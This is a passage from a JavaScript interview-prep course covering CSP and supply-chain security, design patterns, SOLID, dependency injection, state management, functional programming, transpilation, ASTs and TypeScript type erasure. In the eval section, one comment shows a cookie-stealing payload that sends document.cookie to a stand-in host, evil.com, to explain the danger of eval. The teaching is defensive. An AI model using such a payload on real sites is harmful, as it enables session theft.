Even careful code pulls in hundreds of npm dependencies and may handle dynamic strings. CSP is a **safety net** that limits the damage if XSS slips through. Supply-chain controls stop a malicious or hijacked package from silently shipping in your build. And `eval`/`new Function` are how an injected string becomes *executed code* — the ultimate XSS escalation.

#### ⚙️ How does it work?
- **CSP** is a response header listing allowed sources. With `script-src 'self'`, the browser **refuses** to run inline `<script>` or any script from another origin — so even if an attacker injects a `<script>`, CSP blocks its execution. It's a last line of defense, not a replacement for encoding.
- **Supply-chain:** a **lockfile** (`package-lock.json`) pins every dependency to an exact version *and* records an **integrity hash** (a `sha512-…` fingerprint). On install, the package manager re-hashes the downloaded code and **rejects** it if the fingerprint doesn't match — so a tampered package can't silently substitute itself.
- **`eval` / `Function`** take a *string* and run it as code. If any part of that string is attacker-controlled, you've handed them code execution. They also disable certain optimizations and are usually blocked by a strict CSP (`'unsafe-eval'` would be required).

```
  Defense in depth — each layer catches what the last missed:
  ┌──────────────────────────────────────────────┐
  │ 1. Encode output / textContent  (stop XSS)    │
  │ 2. CSP script-src 'self'        (block stray  │
  │                                  scripts)     │
  │ 3. Lockfile + integrity hash    (trust deps)  │
  │ 4. Never eval untrusted strings (no escalate) │
  └──────────────────────────────────────────────┘
```

#### 🌍 Real-life analogy
Think of an airport. **Output encoding** is screening every passenger (don't let a weapon in). **CSP** is the locked cockpit door — even if something gets through screening, it can't reach the controls. **Lockfiles + integrity hashes** are tamper-evident seals on the catering carts: if a seal is broken or the contents don't match the manifest, the cart is rejected. **`eval`** is letting any passenger walk into the cockpit and flip switches — never do it with strangers' instructions.

#### 💻 Code example
```javascript
// CSP — sent as a response header by the server:
//   Content-Security-Policy: default-src 'self'; script-src 'self'
//   → inline <script> and cross-origin scripts are blocked from running

// ❌ DANGEROUS — string becomes executable code
const expr = userInput;        // e.g. "fetch('//evil.com?c='+document.cookie)"
const result = eval(expr);     // runs whatever the attacker sent
const fn = new Function('return ' + userInput)(); // same danger

// ✅ SAFE — parse data as DATA, never as code
const data = JSON.parse(userInput);   // can't execute, only describes values

// Supply-chain — lockfile pins + verifies every dependency:
//   "lodash": {
//     "version": "4.17.21",
//     "integrity": "sha512-v2kDEe57lecTu..."  // install fails if hash differs
//   }
// Use `npm ci` in CI to install EXACTLY the lockfile, and audit regularly:
//   npm ci && npm audit
```

#### 🎤 Interview question
**Q: Why is `eval` dangerous, and what defenses limit the blast radius if XSS gets through?**
A: `eval` (and `new Function`) execute a *string* as code, so any attacker-controlled portion becomes arbitrary code execution — parse data with `JSON.parse` instead. As defense in depth: a strict **CSP** (`script-src 'self'`, no `'unsafe-eval'`) stops injected or inline scripts from running even when XSS slips through; **lockfiles with integrity hashes** plus `npm ci`/`npm audit` keep a tampered or malicious dependency out of your build. No single layer is enough — they stack.

---

<h2 id="module-16">Module 16 — Patterns, Architecture & Design Trade-offs</h2>

Patterns are not magic spells — they're named solutions to problems people kept hitting. This module shows the handful that actually earn their keep in JavaScript, how the SOLID principles translate to a language with no `interface` keyword, and the functional ideas (immutability, pure functions, composition) that quietly power React, Redux, and RxJS. By the end you'll be able to build a pub/sub event emitter from scratch — the single most-asked architecture question in interviews.

---

### 🧠 GoF Patterns, the JavaScript Way — old recipes, new kitchen

#### 🧩 What is it?
The **"Gang of Four" (GoF)** patterns are 23 classic object-oriented design recipes from a famous 1994 book (the four authors are nicknamed the "Gang of Four"). A **design pattern** is just a reusable, named template for solving a recurring code problem. In JavaScript, many of them shrink dramatically because functions are **first-class** (you can pass a function around like any other value) and objects are dynamic.

#### 🤔 Why do we need them? (the problem)
Without shared names, every team reinvents the same structures and argues about them in code review. Patterns give you a **vocabulary**: saying "let's use a Factory here" communicates an entire design in two words. But naively copying Java-style patterns into JS produces bloated code — JS often expresses the same idea in a few lines.

#### ⚙️ How does it work?
Here are the patterns worth knowing, in idiomatic JS:

- **Singleton** — guarantee *one* shared instance. In JS, a module's exports are cached, so an exported object already acts as one *within a single module registry* — you rarely need ceremony.
- **Factory** — a function that decides *which* object to build and returns it, hiding the `new` from the caller.
- **Strategy** — swap one interchangeable behavior for another by passing a function (e.g. different sort comparators).
- **Decorator** — wrap a function/object to add behavior **without** modifying the original (e.g. add logging around a function).
- **Module** — bundle related state and functions, exposing only some of them (the rest stay private). Observer/PubSub gets its own topic below.

```
   Factory hides "which class":
        caller asks ──▶ ┌──────────┐
        "give me a      │ Factory  │──▶ returns
         logger"        └──────────┘    FileLogger
                          chooses        or Console-
                          the type       Logger
```

#### 🌍 Real-life analogy
A **Factory** is a coffee-shop counter: you say "a latte," and you get a finished latte — you never touch the espresso machine or choose which one to use. A **Decorator** is adding oat milk and a cardboard sleeve *around* the same cup without remaking the coffee. A **Singleton** is the shop's single cash register everyone shares.

#### 💻 Code example
```javascript
// FACTORY — caller doesn't say `new`, the factory picks the type
function createLogger(kind) {
  if (kind === "silent") return { log: () => {} };
  return { log: (msg) => console.log("[LOG]", msg) };
}
const log = createLogger("loud");
log.log("hi");            // → [LOG] hi

// STRATEGY — behavior passed in as a function (first-class!)
function sortBy(arr, strategy) {
  return [...arr].sort(strategy);
}
const byLength = (a, b) => a.length - b.length;
sortBy(["ccc", "a", "bb"], byLength); // → ["a", "bb", "ccc"]

// DECORATOR — wrap a fn to add timing, original untouched
function withTiming(fn) {
  return (...args) => {
    const start = Date.now();
    const result = fn(...args);
    console.log("took", Date.now() - start, "ms");
    return result;                 // forward the real return value
  };
}
const slowAdd = withTiming((a, b) => a + b);
slowAdd(2, 3);           // logs "took 0 ms", returns 5
```

#### 🎤 Interview question
**Q: How is a JavaScript Singleton different from a Java one?**
A: In Java you need a private constructor and a static `getInstance()`. In JS, an ES **module** is already a singleton — it's evaluated once and its exports are cached, so anything importing it shares the same object. You usually just export an object literal; the heavyweight class machinery is unnecessary. *(Caveat: that's one instance **per module registry** — duplicate installs in `node_modules`, or different realms like Workers/iframes, can produce more than one copy. This is exactly the classic "two React instances" bug.)*

---

### 📡 Observer / Pub-Sub — the event emitter you'll be asked to build

#### 🧩 What is it?
The **Observer** pattern lets one object (the **subject**) keep a list of dependents (**observers**) and notify them all when something changes. **Pub/Sub** ("publish/subscribe") is the looser, more common variant: publishers send messages to a named **channel** (a topic), and subscribers listen on that channel — neither side knows the other directly. An **event emitter** is the everyday name for a pub/sub object (Node's `EventEmitter`, the DOM's `addEventListener` both work this way).

#### 🤔 Why do we need it? (the problem)
Without it, the part that *causes* an event has to manually call every part that *cares* — so it must import and know about all of them, tangling the code (**tight coupling** — modules glued so closely that changing one forces changes in others). Pub/sub flips this: the emitter only knows "something happened on channel `X`," and anyone interested subscribes independently. Add a new feature by subscribing — no edits to the publisher.

#### ⚙️ How does it work?
A central registry maps each **event name** to a list of **listener** functions (callbacks). Three core operations:

- `on(event, fn)` — **subscribe**: add `fn` to that event's list.
- `emit(event, data)` — **publish**: call every listener for that event with `data`.
- `off(event, fn)` — **unsubscribe**: remove `fn` from the list.

```
   publisher                 EVENT EMITTER
   emit("login", user)       (name → [listeners])
        │                   ┌──────────────────────┐
        └──────────────────▶│ "login": [fnA, fnB]  │
                            │ "logout": [fnC]       │
                            └─────────┬─────────────┘
                       calls each listener for "login"
                  ┌───────────┴───────────┐
                  ▼                       ▼
            fnA(user)               fnB(user)
        (update navbar)         (log analytics)
```

#### 🌍 Real-life analogy
A **newsletter**. The publisher doesn't know you personally — you **subscribe** to the "JavaScript Weekly" channel. When an issue ships, everyone subscribed gets it at once; you can **unsubscribe** anytime; and the publisher never edits its code to add you. Channels = topics, you = a listener.

#### 💻 Code example
```javascript
// A small, runnable event emitter (pub/sub).
class EventEmitter {
  constructor() {
    // Map of eventName -> array of listener functions.
    this.listeners = new Map();
  }

  // SUBSCRIBE: register fn for `event`. Returns an
  // unsubscribe function for convenient cleanup.
  on(event, fn) {
    if (!this.listeners.has(event)) {
      this.listeners.set(event, []);
    }
    this.listeners.get(event).push(fn);
    return () => this.off(event, fn);
  }

  // SUBSCRIBE ONCE: auto-removes itself after first call.
  once(event, fn) {
    const wrapper = (...args) => {
      this.off(event, wrapper); // remove BEFORE calling
      fn(...args);
    };
    return this.on(event, wrapper);
  }

  // UNSUBSCRIBE: remove fn from `event`'s list.
  off(event, fn) {
    const fns = this.listeners.get(event);
    if (!fns) return;
    // filter returns a NEW array without fn; reassign it.
    this.listeners.set(event, fns.filter((f) => f !== fn));
  }

  // PUBLISH: call every listener with the payload.
  emit(event, ...args) {
    const fns = this.listeners.get(event);
    if (!fns) return false;
    // Copy the array so a listener that unsubscribes
    // mid-emit can't corrupt the loop we're iterating.
    [...fns].forEach((fn) => fn(...args));
    return true;
  }
}

// --- Using it ---
const bus = new EventEmitter();

const unsub = bus.on("login", (user) =>
  console.log("navbar: welcome", user)
);
bus.on("login", (user) => console.log("analytics:", user));
bus.once("login", () => console.log("this fires only once"));

bus.emit("login", "Ada");
// → navbar: welcome Ada
// → analytics: Ada
// → this fires only once

bus.emit("login", "Lin");
// → navbar: welcome Lin
// → analytics: Lin        (the `once` listener is gone)

unsub();                   // remove the navbar listener
bus.emit("login", "Tom");
// → analytics: Tom        (navbar listener removed)
```

> **Note (simplification):** real emitters (Node's `EventEmitter`) add more: an `error` event that throws if unhandled, a max-listeners warning to catch leaks, and synchronous ordering guarantees. This version captures the core mechanics, which is what interviews ask for. Note listeners here run **synchronously** in subscription order.

#### 🎤 Interview question
**Q: Implement an event emitter / pub-sub. Why copy the listener array before emitting?**
A: Store a `Map` of event name to an array of callbacks; `on` pushes, `off` filters out, `emit` loops and calls each. You copy the array (`[...fns]`) before looping because a listener might call `off` (or `once` removes itself) **during** emission — mutating the very array you're iterating would skip listeners or throw. Iterating a snapshot keeps `emit` predictable.

---

### 🧱 SOLID in JS/TS — five principles, minus the ceremony

#### 🧩 What is it?
**SOLID** is five object-oriented design principles (the letters spell SOLID) meant to keep code flexible and easy to change:

- **S** — Single Responsibility: a module should have one reason to change.
- **O** — Open/Closed: open to **extension**, closed to **modification** (add behavior without editing existing code).
- **L** — Liskov Substitution: a subtype must be usable anywhere its parent type is, without surprises.
- **I** — Interface Segregation: many small, focused interfaces beat one fat one.
- **D** — Dependency Inversion: depend on **abstractions**, not concrete implementations.

#### 🤔 Why do we need them? (the problem)
Code that violates SOLID becomes rigid: one change ripples everywhere, and you fear touching it. SOLID is a checklist for "will this be painful to change in six months?" The catch: it was written for class-heavy Java. JavaScript reaches several goals *differently* — sometimes more simply.

#### ⚙️ How does it work? — the JS translation
- **S** maps cleanly: keep each function/module doing one job.
- **O** in JS is often a **Strategy** or plugin — pass in behavior instead of editing a `switch`.
- **L** still applies to `class extends`: an overridden method shouldn't break the parent's contract (e.g. don't make it throw where the parent returned).
- **I**: JS has no `interface` keyword at runtime, so this is about **duck typing** — "if it has the methods I call, it fits." Pass objects with only the methods a function needs. (TypeScript adds real compile-time `interface`s.)
- **D**: instead of a function reaching out to `import`-ed concrete code, **pass dependencies in** (next topic). This is the principle behind dependency injection.

```
   Dependency Inversion:
   high-level code ──▶ depends on ──▶ ┌──────────────┐
   (OrderService)                     │  abstraction │
                                      │ "a Mailer    │
                                      │  with send()"│
                                      └──────┬───────┘
   low-level code ──▶ implements ──────────┘
   (SmtpMailer, FakeMailer) plug in here
```

#### 🌍 Real-life analogy
**Single Responsibility** is a kitchen where one station chops, one fries, one plates — if the menu changes, you retrain *one* station, not the whole line. **Open/Closed** is a power strip: you add devices by plugging into a socket, never by rewiring the wall.

#### 💻 Code example
```javascript
// Open/Closed via Strategy: add discount types by passing
// a function — never edit `checkout` itself.
const noDiscount   = (total) => total;
const tenPercent   = (total) => total * 0.9;
const flatFive     = (total) => total - 5;

function checkout(total, discountStrategy = noDiscount) {
  return discountStrategy(total);   // closed to edits, open to new strategies
}

checkout(100);              // → 100
checkout(100, tenPercent);  // → 90
checkout(100, flatFive);    // → 95
// A new "blackFriday" discount is just another function — no edit here.
```

#### 🎤 Interview question
**Q: How does SOLID map onto JavaScript, and where does it not?**
A: Single Responsibility, Liskov, and Open/Closed carry over directly. Open/Closed is usually done with first-class functions (Strategy) rather than subclassing. Interface Segregation relies on **duck typing** in plain JS (there's no `interface` at runtime) and on TypeScript `interface`s at compile time. Dependency Inversion becomes "inject dependencies instead of importing concretes." The spirit transfers; the heavy class machinery often doesn't.

---

### 🔌 Dependency Injection & Inversion of Control — don't reach out, get handed in

#### 🧩 What is it?
**Dependency Injection (DI)** means a piece of code receives the things it needs (its **dependencies**) as arguments, instead of creating or importing them itself. **Inversion of Control (IoC)** is the broader idea: the *caller* decides which concrete pieces get wired in, "inverting" who's in control of those choices.

#### 🤔 Why do we need it? (the problem)
If a `UserService` does `import { db } from "./realDatabase"` directly, it is **welded** to that one database. You can't test it without a real DB, and you can't swap implementations. Injecting the database instead lets you pass a fake one in tests and a real one in production — same code, different wiring.

#### ⚙️ How does it work?
Pass dependencies in through the **constructor** or function **parameters**. The code depends only on the *shape* (which methods it calls), not the concrete source.

```
   WITHOUT DI (welded):
   UserService ──imports──▶ realDatabase   (stuck)

   WITH DI (injected):
   caller picks ──▶ new UserService(db)
                            ▲
            db = realDatabase  (in production)
            db = fakeDatabase  (in tests)
```

#### 🌍 Real-life analogy
A **drill with swappable bits**. The drill doesn't have one welded-on drill bit; you *insert* the bit you need — wood, metal, screwdriver. The drill (your service) stays the same; you inject the right bit (dependency) for the job. Tests just snap in a practice bit.

#### 💻 Code example
```javascript
// The service depends only on "something with .find()" —
// not on any specific database. That's dependency inversion.
class UserService {
  constructor(database) {     // injected, not imported
    this.db = database;
  }
  getName(id) {
    return this.db.find(id)?.name ?? "unknown";  // ?. and ?? for null safety
  }
}

// Production wiring:
const realDb = { find: (id) => ({ id, name: "Ada" }) };
new UserService(realDb).getName(1);   // → "Ada"

// Test wiring — a fake, no real database needed:
const fakeDb = { find: () => null };
new UserService(fakeDb).getName(1);   // → "unknown"
```

#### 🎤 Interview question
**Q: What problem does dependency injection solve, and how would you design a plugin system with it?**
A: It decouples code from concrete dependencies, making it testable and swappable — you inject a fake in tests, the real thing in production. A plugin system is DI plus discovery: define a contract (e.g. "a plugin is an object with `name` and `apply(context)`"), let the host accept an array of such plugins, and call each at the right lifecycle point. The host depends on the *contract*, never on specific plugins — new plugins drop in without editing the core.

---

### 🌊 State Management Paradigms — taming who-changes-what

#### 🧩 What is it?
**State** is the data your app remembers (the logged-in user, items in a cart). A **state-management paradigm** is a discipline for *how* that data is allowed to change. Three big ones:

- **Unidirectional data flow** — state changes travel one direction only (Redux, React).
- **Event-driven** — parts communicate by emitting/handling events (the pub/sub above, scaled up).
- **Reactive** — values are **streams** that automatically push updates to whatever depends on them (RxJS **observables**, Vue/Solid signals).

#### 🤔 Why do we need them? (the problem)
When any code can mutate any state from anywhere, a bug becomes a detective story: *who* changed this, and *when*? These paradigms add **predictability** by constraining the change paths, so you can trace and reason about updates.

#### ⚙️ How does it work?
**Unidirectional** flow funnels every change through one path: an **action** (a description of what happened) goes to a **reducer** (a pure function that computes the next state), producing new state that re-renders the view. The view can only **dispatch** actions — never poke state directly.

```
   UNIDIRECTIONAL DATA FLOW (one-way loop)

   ┌────────┐  dispatch   ┌──────────┐
   │  VIEW  │────────────▶│  ACTION  │
   └────────┘             └────┬─────┘
       ▲                       ▼
       │ re-render        ┌──────────┐
   ┌───┴────┐   new state │ REDUCER  │
   │ STORE  │◀────────────┤(pure fn) │
   └────────┘             └──────────┘
   State only changes through this single loop.
```

**Reactive** flips the model: you declare relationships once (`total = price * qty`), and when `price` changes, `total` updates *itself* — updates **push** downstream automatically.

#### 🌍 Real-life analogy
Unidirectional flow is a **drive-thru**: you can't wander into the kitchen and grab food — you place an order at one window (dispatch), and it comes back out one window (new state). One entrance, one exit, fully traceable. Reactive state is a **spreadsheet**: change cell `A1` and every formula referencing it recalculates instantly, no manual refresh.

#### 💻 Code example
```javascript
// Tiny unidirectional store (the heart of Redux).
function createStore(reducer, initialState) {
  let state = initialState;
  const subscribers = [];

  return {
    getState: () => state,
    dispatch(action) {
      state = reducer(state, action);   // pure: new state from old + action
      subscribers.forEach((fn) => fn(state)); // notify (pub/sub again!)
    },
    subscribe(fn) { subscribers.push(fn); },
  };
}

// Reducer: a PURE function (old state + action) -> new state.
function counter(state, action) {
  switch (action.type) {
    case "inc": return { count: state.count + 1 };
    case "dec": return { count: state.count - 1 };
    default:    return state;
  }
}

const store = createStore(counter, { count: 0 });
store.subscribe((s) => console.log("count is", s.count));
store.dispatch({ type: "inc" });   // → count is 1
store.dispatch({ type: "inc" });   // → count is 2
store.dispatch({ type: "dec" });   // → count is 1
```

#### 🎤 Interview question
**Q: What is unidirectional data flow and why is it easier to debug?**
A: State changes flow through a single path: views dispatch **actions**, a pure **reducer** computes the next state, and the new state re-renders views — views never mutate state directly. Debugging is easier because every change has exactly one cause (an action) and one place it's applied (the reducer), so you can log, replay, and reason about updates instead of hunting which random line mutated a shared object.

---

### ➗ The Functional Core — pure functions, immutability & composition

#### 🧩 What is it?
A cluster of functional-programming ideas that keep logic predictable:

- **Pure function** — same inputs always give the same output, and it changes nothing outside itself (no **side effects** like writing a global or logging).
- **Immutability** — never mutate data in place; produce a *new* value instead.
- **Composition** — build big functions by chaining small ones (output of one feeds the next).
- **Currying** — turn a function of many arguments into a chain of one-argument functions.
- **Functor / Monad** *(conceptual)* — a "wrapper with a `map`" lets you apply a function to a wrapped value without unwrapping it; an array (`[1,2].map(...)`) is the everyday example.

#### 🤔 Why do we need it? (the problem)
Mutating shared data and hidden side effects are the top sources of "works on my machine" bugs. Pure functions are trivially testable (no setup, no mocks) and safe to cache, parallelize, and reorder — because they can't secretly affect anything else.

#### ⚙️ How does it work?
A **pure** function reads only its arguments and returns only a value. **Immutability** uses copy-and-change (`{...obj, x: 1}`, `[...arr, item]`) instead of `obj.x = 1`. **Composition** wires them: `pipe(f, g)(x)` means `g(f(x))`.

```
   COMPOSITION pipeline: pipe(double, inc)(5)

   5 ──▶ ┌────────┐ ──▶ 10 ──▶ ┌─────┐ ──▶ 11
         │ double │            │ inc │
         └────────┘            └─────┘
   data flows left → right, each fn pure
```

#### 🌍 Real-life analogy
A **pure function** is a vending machine: button B4 always drops the same snack and affects nothing else in the room. **Immutability** is editing a document by **"Save As" a new copy** instead of scribbling on the original — the old version stays intact (great for undo). **Currying** is a coffee order taken in steps: "size?" → "milk?" → "sugar?" — each answer narrows it down until the drink is made.

#### 💻 Code example
```javascript
// PURE: depends only on input, mutates nothing.
const inc = (n) => n + 1;
const double = (n) => n * 2;

// IMMUTABLE update: new object, original untouched.
const user = { name: "Ada", age: 36 };
const older = { ...user, age: user.age + 1 };
user.age;   // → 36   (unchanged)
older.age;  // → 37

// COMPOSITION: left-to-right pipe.
const pipe = (...fns) => (x) => fns.reduce((acc, fn) => fn(acc), x);
const transform = pipe(double, inc);
transform(5);   // → double(5)=10, then inc(10)=11

// CURRYING: take args one at a time.
const add = (a) => (b) => a + b;
const add10 = add(10);   // remembers a = 10 (a closure!)
add10(5);                // → 15

// FUNCTOR-ish: an array is "a box you can map over"
[1, 2, 3].map(double);   // → [2, 4, 6]  (box stays a box)
```

> **Note (simplification):** "a functor is anything with a law-abiding `map`" is the practical gloss; the full definition adds mathematical laws (identity and composition) from category theory. A **monad** additionally supports `flatMap`/`chain` for sequencing wrapped values (think `Promise.then`). You don't need the theory to use `map`, `flatMap`, and `then` correctly.

#### 🎤 Interview question
**Q: When does immutability help, and when does it cost you?**
A: It helps wherever change-tracking and predictability matter: unidirectional state (cheap "did this change?" checks by reference), undo/redo, safe sharing across async code, and easy testing — nothing mutates behind your back. It costs you in **performance and memory** on large or hot data, because you allocate new objects/arrays on every change instead of editing in place. The pragmatic answer: default to immutability for app state, but allow local mutation inside a function's own scope (where no one else can observe it) when profiling shows it matters.

---

<h2 id="module-17">Module 17 — Tooling & The Compilation Layer</h2>

You write modern JavaScript with arrow functions, `async`/`await`, and TypeScript types — yet the code that actually ships to a 2015 browser looks nothing like what you typed. Somewhere between your editor and the user's screen, an invisible factory rewrites, checks, and shrinks your code. This module opens that factory: how transpilers rewrite syntax, how tools edit your code by understanding its *shape*, why TypeScript's safety stops at runtime's door, and how bundlers turn hundreds of files into one tight package.

---

### 🔄 Transpilation & Downleveling — Rewriting New Syntax Into Old

#### 🧩 What is it?
**Transpilation** is translating source code from one version of a language into *another version of the same language*. The most common job is **downleveling** (also called "downcompiling"): rewriting **new** JavaScript syntax (arrow functions, `async`/`await`, classes) into **older** JavaScript that old browsers understand. **Babel** is the famous tool that does this — a **transpiler** (a compiler that goes language-to-language, not language-to-machine-code).

> **Note (simplification):** "transpiler" and "compiler" overlap. A transpiler is just a compiler whose *output* is also high-level source code. People use the words interchangeably.

#### 🤔 Why do we need it? (the problem)
You want to write today's clean syntax, but you can't control which browser your user has. An old browser that has never heard of `=>` will throw a **`SyntaxError`** and your whole script dies — not just that one line. Downleveling lets you **write modern, ship ancient**: you author in ES2023, and Babel hands the old browser an equivalent it can actually parse.

There's a key distinction to gloss here:
- **Syntax** (grammar — `=>`, `class`, `async`) can be **transpiled** by rewriting it.
- **Missing APIs** (like `Promise` or `Array.prototype.flat` not existing at all) can't be rewritten — they need a **polyfill** (a chunk of code that *implements* the missing feature). Babel handles syntax; polyfills (e.g. `core-js`) fill in the APIs.

#### ⚙️ How does it work?
Babel runs a three-stage pipeline. It never edits your text as a string — it turns the code into a **tree** first (more on that in the next topic), transforms the tree, then prints it back out:

```
  YOUR SOURCE (modern)
        │
        ▼  PARSE: text -> AST (tree)
   ┌──────────┐
   │   AST    │  a tree describing the code's
   │  (tree)  │  structure, not its characters
   └────┬─────┘
        ▼  TRANSFORM: plugins rewrite tree nodes
   ┌──────────┐   arrow node -> function node,
   │  new AST │   await node  -> state-machine nodes
   └────┬─────┘
        ▼  GENERATE: AST -> text
   OUTPUT (old-target JS)
```

Which transforms run is decided by your **target**: you tell Babel "support browsers back to 2017" (via a `@babel/preset-env` config), and it only downlevels the features those browsers lack.

#### 🌍 Real-life analogy
Think of a **translator at the United Nations**. You speak in fast modern slang (new syntax). An elderly delegate only understands formal 1950s English (old browser). The translator doesn't translate word-by-word blindly — they *understand the meaning of your sentence*, then re-express that same meaning in the older, more verbose dialect the delegate can follow. Same message, different (older) words.

#### 💻 Code example
Here is what downleveling *actually emits*. An arrow function and `async`/`await` look small, but their old-target equivalents are surprisingly large.

```javascript
// ── BEFORE (what you write) ──────────────────────────
const add = (a, b) => a + b;

// ── AFTER (downleveled to ES5-ish) ───────────────────
// Arrow funcs become regular functions. (The bigger reason
// to convert them: an arrow captures `this` lexically, so a
// faithful transpile must also preserve that `this` behavior.)
var add = function (a, b) {
  return a + b;
};
```

```javascript
// ── BEFORE: async/await ──────────────────────────────
async function getUser() {
  const res = await fetch('/user');
  return res.json();
}

// ── AFTER (concept of the downleveled output) ────────
// async/await has NO equivalent keyword in old JS, so Babel
// rewrites the function into a GENERATOR + a helper that
// steps through it. Each `await` becomes a "pause point" the
// helper resumes when the promise settles. Roughly:
function getUser() {
  return _asyncToGenerator(function* () {  // generator = pausable fn
    const res = yield fetch('/user');      // `await` -> `yield`
    return res.json();
  })();
}
// `_asyncToGenerator` is a runtime helper Babel injects: it drives
// the generator, feeding resolved promise values back in on each
// `.next()`. So one tidy `await` can emit ~40 lines of machinery.
// (This shape targets engines that HAVE generators. For true ES5 — no
// generators either — Babel goes one step further, lowering the
// `function*` into a regenerator-runtime state machine, so no
// `function*` survives in the final ES5 output.)
```

> **Note (simplification):** the real Babel output names and helper bodies are longer and uglier; the shape above (async fn -> generator + driver, `await` -> `yield`) is the accurate mental model, mirroring Module 8's "`async`/`await` is generators + promises."

#### 🎤 Interview question
**Q: What does `async/await` compile to when you target an old browser?**
A: It can't map to any old keyword, so the transpiler rewrites the function body into a **generator function** plus a small **runtime helper** that drives it. Each `await` becomes a `yield` — a pause point — and the helper calls `.next()` to resume the generator once the awaited promise settles, feeding the resolved value back in. The result is much larger than the source: one `await` can emit dozens of lines of state-machine plumbing.

**Q: Transpiling vs polyfilling — what's the difference?**
A: Transpiling rewrites **syntax** the old engine can't parse (e.g. `=>` into `function`). Polyfilling supplies **missing APIs** the old engine doesn't have (e.g. defining `Promise` or `Array.prototype.flat` if absent). Babel does the first; a library like `core-js` does the second.

---

### 🌳 ASTs, Codemods & ESLint Rules — Editing Code by Its Shape, Not Its Text

#### 🧩 What is it?
An **AST** (Abstract Syntax Tree) is your code represented as a **tree of objects** instead of a flat string of characters. Every construct — a variable, a function call, an `if` — becomes a labeled **node** with children. Tools that want to *understand* or *change* code work on the AST, never on raw text.

Two things built on ASTs:
- A **codemod** — an automated script that rewrites code *across your whole codebase* by transforming the AST (e.g. "rename every `oldFn(` call to `newFn(`").
- An **ESLint rule** — a small program that walks the AST looking for patterns and **reports** (or auto-fixes) problems (e.g. "warn on any `var`").

#### 🤔 Why do we need it? (the problem)
Why not just use find-and-replace on the text? Because text has no idea what it's looking at. A naive search for the word `count` would also match `accountId`, the string `"count them"`, and a comment. Text editing is **blind**. An AST **knows** that *this* `count` is a variable name and *that* one is inside a string — so a transform can target exactly the right thing and leave the rest untouched. This is why every serious refactor tool, linter, and formatter operates on ASTs.

#### ⚙️ How does it work?
The same parse step from the transpiler produces the tree. Tools then **traverse** (walk) it, and when they find a node matching their pattern, they **inspect**, **report**, or **replace** it:

```
   source:  const x = 1;
                  │  parse
                  ▼
        ┌─────────────────────┐
        │ VariableDeclaration │   kind: "const"
        └──────────┬──────────┘
                   ▼
          ┌────────────────┐
          │  Declarator    │
          └───┬────────┬───┘
              ▼        ▼
        Identifier   NumericLiteral
          "x"            1

   A codemod / ESLint rule WALKS this tree,
   matches a node type, then reports or edits it.
```

A tiny ESLint rule is just: "when you visit a node of type `VariableDeclaration` whose `kind` is `"var"`, report it." The traversal machinery calls your function once per matching node.

#### 🌍 Real-life analogy
Imagine you must change every street address in a 900-page legal contract. Doing it with find-and-replace on the raw text risks mangling a date or a name that happens to contain the same digits. Instead you hand it to a **lawyer** who has parsed the document into a structured outline — clauses, parties, addresses. You say "update the *address* field in every party clause," and they change exactly those, never touching a quoted line or a footnote. The AST is that structured outline; the codemod is the instruction.

#### 💻 Code example
```javascript
// A minimal ESLint rule: forbid `var`. ESLint hands you the AST
// and calls your "visitor" function for each matching node.
module.exports = {
  create(context) {
    return {
      // This key is an AST NODE TYPE. ESLint calls this function
      // every time it walks onto a `VariableDeclaration` node.
      VariableDeclaration(node) {
        if (node.kind === 'var') {        // read a field off the tree node
          context.report({
            node,
            message: "Use 'let' or 'const' instead of 'var'.",
          });
        }
      },
    };
  },
};
// Run against `var x = 1;` -> reports the error.
// Run against `let x = 1;` -> silent (node.kind is "let").
// Notice: we never scanned text or used regex — we read the TREE.
```

#### 🎤 Interview question
**Q: Why do linters and codemods work on an AST instead of doing text find-and-replace?**
A: Because text is ambiguous — the same characters can be a variable, a string, or a comment, and a regex can't tell them apart. An AST encodes the code's actual structure, so a tool can match precisely (e.g. "only real `var` declarations, not the word 'var' in a string") and transform safely without breaking unrelated code.

**Q: At a high level, what's an ESLint rule?**
A: A small object with **visitor functions** keyed by AST node type. ESLint parses your code into a tree and walks it; each time it lands on a node whose type matches one of your visitors, it calls that function. The function inspects the node and may call `context.report(...)` to flag a problem (optionally supplying a fix).

---

### 🧯 TypeScript & Type Erasure — Why Types Vanish at Runtime

#### 🧩 What is it?
**TypeScript** is JavaScript plus a layer of **type annotations** — labels like `: string` or `: number[]` that describe what shape your data should have. A separate program, the **TypeScript compiler** (`tsc`), checks those labels *before* you run anything, then **strips them off**, emitting plain JavaScript. This stripping is called **type erasure**: the types exist only at **compile time** and are completely **gone at runtime**.

TypeScript also uses **structural typing** ("duck typing"): a value fits a type if it has the right *shape* (the required properties), regardless of what class or name it came from. "If it has all the duck properties, it counts as a duck."

#### 🤔 Why do we need to know this? (the problem)
Beginners assume a `: User` annotation *protects* them at runtime — that bad data can't get in. **It can.** Because types are erased, **there is no type-check left when your program actually runs.** A value arriving from a network request, a JSON file, `localStorage`, or a form can be *completely the wrong shape*, and TypeScript will neither know nor care, because by then every annotation is gone. The types guaranteed nothing about the *outside world* — only about code you compiled together.

```typescript
// You PROMISE the compiler this returns a User.
const user = await res.json() as User;
// But `as User` is just you telling tsc "trust me." At runtime
// `res.json()` could be anything — null, a number, an error blob.
// No check happens. user.name might explode with: undefined.
```

#### ⚙️ How does it work?
`tsc` does two independent jobs in order: **(1) type-check** (find errors, but produce no runtime effect), then **(2) emit** (delete all types, output JS). The output is what runs — and it has no memory of the types.

```
   greet(name: string): string   <-- TypeScript source
        │
        ▼  tsc step 1: TYPE-CHECK
   "is `name` used as a string? yes -> ok"   (compile-time only)
        │
        ▼  tsc step 2: EMIT (erase types)
   function greet(name) { ... }   <-- shipped JS: types GONE
        │
        ▼  at RUNTIME
   greet(42)  // nothing stops this — no type info survives
```

The fix at the program's edges — the **I/O boundaries** where untrusted data enters — is **runtime validation**: actually *check* the data with real code. A library like **Zod** lets you declare a schema once and both validate at runtime *and* derive the TypeScript type from it, so the compile-time type and the runtime check can't drift apart.

#### 🌍 Real-life analogy
TypeScript types are like the **dress-code rules printed on a wedding invitation**. While you're planning (compile time), they help everyone coordinate and catch mistakes — "you can't wear jeans to this." But on the wedding day, the invitation isn't standing at the door. If a stranger in jeans walks in off the street (data from the network), nothing on the *invitation* stops them. For that you need an actual **bouncer checking people at the entrance** — that bouncer is runtime validation (Zod) at the I/O boundary.

#### 💻 Code example
```typescript
// ❌ TRAP: trusting an annotation on external data.
type User = { name: string; age: number };

async function loadUserBad(): Promise<User> {
  const res = await fetch('/api/user');
  return res.json() as User;   // `as User` = a LIE you tell the compiler.
  // If the API returns { name: "Sam" } (no age), TS stays silent.
